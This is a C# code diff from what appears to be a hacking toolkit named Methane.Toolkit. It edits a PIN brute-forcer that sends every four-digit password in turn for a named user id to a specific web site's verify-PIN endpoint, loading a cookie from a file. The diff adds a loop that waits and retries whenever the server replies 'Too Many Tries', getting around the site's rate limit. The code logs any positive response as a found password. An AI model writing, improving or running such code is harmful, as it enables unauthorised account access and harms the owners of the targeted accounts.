@@ -6,6 +6,8 @@ using static Methane.Toolkit.Common;
 using System.Text;
 using HtmlAgilityPack;
 using System.Net.Http;
+using Methane.Toolkit;
+
 
 namespace Methane.Toolkit
 {
@@ -13,14 +15,10 @@ namespace Methane.Toolkit
     {
 
 
-        string cookie;
-        string bl;
+        string cookie = "";
+        readonly string bl = "";
 
-        Dictionary<string, string> Names;
 
-        public void PromptParamenters()
-        {
-        }
 
 
         public void Run()
@@ -37,20 +35,20 @@ namespace Methane.Toolkit
 
 
 
-            //cookie = "cookie.txt";
-            //try
-            //{
-            //    cookie = File.ReadAllText(cookie);
-            //}
-            //catch (Exception ex)
-            //{
-            //    LogError(ex, "Cannot read the Cookie file");
-            //    //return;
-            //    cookie = "no:cookie";
-            //}
+            cookie = "cookie.txt";
+            try
+            {
+                cookie = File.ReadAllText(cookie);
+            }
+            catch (Exception ex)
+            {
+                LogError(ex, "Cannot read the Cookie file");
+                //return;
+                cookie = "no:cookie";
+            }
 
 
-            Log(GetForm("https://getlinks.info/love/verifypin.php?userid=ggtphtp&pwd=1111"));
+            Log(GetForm("https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd=1111"));
 
 
             for (int i = 0; i < 99; i++)
@@ -61,7 +59,8 @@ namespace Methane.Toolkit
                     return;
                 }
 
-                new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(ThrURLPass)) { Name = i.ToString() }.Start(i * 100);
+                ThrURLPass(i * 100);
+                //new System.Threading.Thread(new System.Threading.ParameterizedThreadStart(ThrURLPass)) { Name = i.ToString() }.Start(i * 100);
                 runningThreads++;
             }
 
@@ -81,16 +80,27 @@ namespace Methane.Toolkit
 
             for (int i = passI; i < passI + 100; i++)
             {
+                TryAgain:
                 string pass = i.ToString("0000");
-                string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=ggtphtp&pwd={pass}");
+                //string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd={pass}");
+                string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd={pass}");
 
                 if (resp.Contains("Incorrect Password"))
                 {
                     Log($"Pass {pass} is wrong");
                 }
+                else if (resp.Contains("Too Many Tries"))
+                {
+
+                    Log($"Too Many Tries {pass}");
+                    //runningThreads--;
+                    //return;
+                    System.Threading.Thread.Sleep(1000);
+                    goto TryAgain;
+                }
                 else
                 {
-                    string l = $"Possitive response {pass} \n {resp} \n \n";
+                    string l = $"Positive response {pass} \n {resp} \n \n";
                     Log(l);
                     FoundPass = true;
                     result = l;
@@ -192,7 +202,7 @@ namespace Methane.Toolkit
             wr.Method = "GET";
             wr.ContentType = "application/x-www-form-urlencoded";
 
-            if (cookie != "") wr.Headers.Add(HttpRequestHeader.Cookie, cookie);
+            if (cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, cookie);
 
 
             // Get the response from remote server
@@ -212,13 +222,13 @@ namespace Methane.Toolkit
             return sb.ToString();
         }
 
-        public HtmlDocument GetFormDoc(string url, string cookie = "")
+        public static HtmlDocument GetFormDoc(string url, string cookie = "")
         {
             var wr = WebRequest.CreateHttp(url);
             wr.Method = "GET";
             // wr.ContentType = "multipart/form-data; boundary=---------------------------19609895721194";
 
-            if (cookie != "") wr.Headers.Add(HttpRequestHeader.Cookie, cookie);
+            if (cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, cookie);
 
 
             // Get the response from remote server
@@ -235,3 +245,4 @@ namespace Methane.Toolkit
     }
 
 }
+
